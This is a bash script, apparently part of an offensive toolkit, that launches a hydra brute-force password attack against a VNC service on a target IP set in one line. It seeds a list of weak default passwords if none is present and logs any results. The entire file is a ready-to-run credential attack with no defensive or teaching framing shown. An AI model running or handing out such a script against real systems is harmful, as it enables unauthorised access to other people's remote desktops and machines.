#!/bin/bash

# ═══════════════════════════════════════════════════════════════════
# VNC BRUTE-FORCE - ONE LINE CHANGE
# ═══════════════════════════════════════════════════════════════════

TARGET="192.168.1.1"  # <-- CHANGE THIS TO YOUR TARGET

# ═══════════════════════════════════════════════════════════════════

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

# Auto-source utilities
source "$PROJECT_ROOT/scripts/logger.sh" 2>/dev/null || true
source "$PROJECT_ROOT/scripts/vpn_check.sh" 2>/dev/null && require_vpn "false"

# Configuration
PORT=5900
THREADS=4  # VNC is sensitive, use fewer threads
PASSLIST="$PROJECT_ROOT/config/admin_passwords.txt"

echo "════════════════════════════════════════════════════════"
echo "  VNC BRUTE-FORCE ATTACK"
echo "  Target: $TARGET:$PORT"
echo "════════════════════════════════════════════════════════"

# Check if hydra exists
if ! command -v hydra &>/dev/null; then
    echo "[!] Hydra not installed. Run: bash install.sh"
    exit 1
fi

# Create default password file if missing
[ ! -f "$PASSLIST" ] && echo -e "password\nadmin\nvnc123" > "$PASSLIST"

# VNC uses password-only authentication
hydra -P "$PASSLIST" -t "$THREADS" -f vnc://"$TARGET:$PORT" | tee -a "$PROJECT_ROOT/logs/vnc_attack.log"

echo ""
echo "════════════════════════════════════════════════════════"
echo "  ATTACK COMPLETE - Check logs for results"
echo "════════════════════════════════════════════════════════"
